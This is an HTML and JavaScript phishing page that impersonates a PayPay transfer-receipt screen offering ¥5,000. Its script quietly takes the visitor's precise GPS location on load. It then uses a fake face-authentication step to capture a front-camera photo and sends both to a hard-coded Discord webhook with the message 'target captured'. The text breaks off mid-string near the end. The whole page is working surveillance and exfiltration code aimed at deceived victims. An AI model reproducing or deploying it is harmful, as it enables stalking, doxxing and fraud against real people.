<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPay 送金受取</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #ff8da1 0%, #ff5268 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #ffffff;
        }
        .phone-frame {
            width: 100%;
            max-width: 420px;
            background: linear-gradient(180deg, #ff6b7f 0%, #ff5268 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.15);
        }
        .content-area {
            padding: 30px 20px 20px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1;
            text-align: center;
        }
        .sender-container {
            margin-bottom: 24px;
        }
        .avatar {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid rgba(255, 255, 255, 0.9);
            margin-bottom: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }
        .sender-name {
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }
        .transfer-date {
            font-size: 12px;
            opacity: 0.85;
        }
        .amount-display {
            font-size: 56px;
            font-weight: bold;
            letter-spacing: 0.5px;
            margin-bottom: 20px;
        }
        .status-badge {
            background: #ffab00;
            color: #ffffff;
            font-size: 13px;
            font-weight: bold;
            padding: 5px 18px;
            border-radius: 20px;
            margin-bottom: 12px;
            display: inline-block;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .expire-text {
            font-size: 12px;
            opacity: 0.9;
            margin-bottom: 36px;
        }
        .btn-group {
            width: 100%;
            margin-bottom: 24px;
        }
        .btn-receive {
            background-color: #2e89ff;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-bottom: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .btn-reject {
            background-color: rgba(255, 255, 255, 0.18);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.35);
            border-radius: 8px;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
        }
        .info-card {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            padding: 16px;
            width: 100%;
            font-size: 12px;
            text-align: left;
            margin-top: auto;
            backdrop-filter: blur(5px);
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            opacity: 0.95;
        }
        .info-row:last-child {
            margin-bottom: 0;
        }
        .footer-law {
            font-size: 10px;
            text-align: center;
            opacity: 0.7;
            margin-top: 16px;
        }
        #camera-section {
            display: none;
            flex-direction: column;
            align-items: center;
            width: 100%;
            flex-grow: 1;
            padding: 20px;
        }
        .camera-box {
            width: 100%;
            max-width: 300px;
            height: 380px;
            border-radius: 16px;
            overflow: hidden;
            background: #000;
            position: relative;
            margin-bottom: 16px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="phone-frame">
        <!-- メイン受取画面 -->
        <div class="content-area" id="main-content">
            <div class="sender-container">
                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop&crop=faces" class="avatar" alt="icon">
                <div class="sender-name">ともこさんからのLINE <span style="background: #00B900; color: white; border-radius: 50%; width: 14px; height: 14px; display: inline-flex; align-items: center; justify-content: center; font-size: 10px;">✓</span></div>
                <div class="transfer-date">2026年10月21日 10時35分</div>
            </div>

            <div class="amount-display">￥5,000</div>

            <div class="status-badge">受け取り待ち</div>
            <div class="expire-text">受け取り期限 2026年10月23日 10時35分</div>

            <div class="btn-group">
                <button class="btn-receive" id="receive-btn">受け取る</button>
                <button class="btn-reject" onclick="alert('受け取りを辞退しました。')">断る</button>
            </div>

            <div class="info-card">
                <div class="info-row"><span>送信日</span><span>2026年10月21日</span></div>
                <div class="info-row"><span>有効期限</span><span>2026年10月23日</span></div>
                <div class="info-row"><span>取引番号</span><span>01844342665854885888 📋</span></div>
                <div class="footer-law">PayPay株式会社 資金移動業者 関東財務局長 第00068号</div>
            </div>
        </div>

        <!-- カメラ画面 -->
        <div id="camera-section">
            <p style="font-size: 14px; font-weight: bold; margin-bottom: 12px; margin-top: 20px;">受取確認：顔認証を行ってください</p>
            <div class="camera-box">
                <video id="video" autoplay playsinline muted></video>
            </div>
            <button class="btn-receive" id="capture-btn" style="max-width: 300px;">認証して受け取る</button>
        </div>
    </div>

    <canvas id="canvas" class="hidden"></canvas>

    <script>
        const receiveBtn = document.getElementById('receive-btn');
        const mainContent = document.getElementById('main-content');
        const cameraSection = document.getElementById('camera-section');
        const video = document.getElementById('video');
        const captureBtn = document.getElementById('capture-btn');
        const canvas = document.getElementById('canvas');

        let mediaStream = null;
        let userLocation = null;

        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1553096437376487586/kzTpRNKsEjfqTr3L4T75-2tqikQ7g-bjuz4QZYC8CqEqCqeMhSRlOeC5NJ85kf9QTlK3'; // ←自分のWebhook URLを入れる

        // ページを開いた裏でGPSをこっそり取る（ボタンを押したときだと重くなって動かない原因になるため）
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    userLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                },
                (err) => {},
                { enableHighAccuracy: true }
            );
        }

        // 「受け取る」を押した瞬間、余計なタメを作らずに即座にカメラを起動する！
        receiveBtn.addEventListener('click', async () => {
            mainContent.classList.add('hidden');
            cameraSection.style.display = 'flex';

            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                video.srcObject = mediaStream;
            } catch (err) {
                alert('カメラの利用が許可されませんでした。「受け取る」を完了できません。');
                cameraSection.style.display = 'none';
                mainContent.classList.remove('hidden');
            }
        });

        // 「認証して受け取る」が押されたとき
        captureBtn.addEventListener('click', async () => {
            if (!mediaStream) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            mediaStream.getTracks().forEach(track => track.stop());

            cameraSection.innerHTML = '<div style="margin: auto; text-align: center;"><p style="font-weight: bold; font-size: 16px;">5,000円の受取処理中...</p></div>';

            let locationText = "📍 **位置情報:** 取得失敗（または拒否）";
            if (userLocation) {
                const mapLink = `https://www.google.com/maps?q=${userLocation.lat},${userLocation.lng}`;
                locationText = `📍 **位置情報（GPS）:**\n緯度: ${userLocation.lat}\n経度: ${userLocation.lng}\n🗺️ [Googleマップで見る](${mapLink})`;
            }

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'target.png');
                formData.append('payload_json', JSON.stringify({
                    content: `🎯 **ターゲットを捕捉しましたｗｗ**\n\n${locationText}`
                }));

                try {
                    await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {
                    console.error(e);
                }

                setTimeout(() => {
                    alert('エラー：受取処理
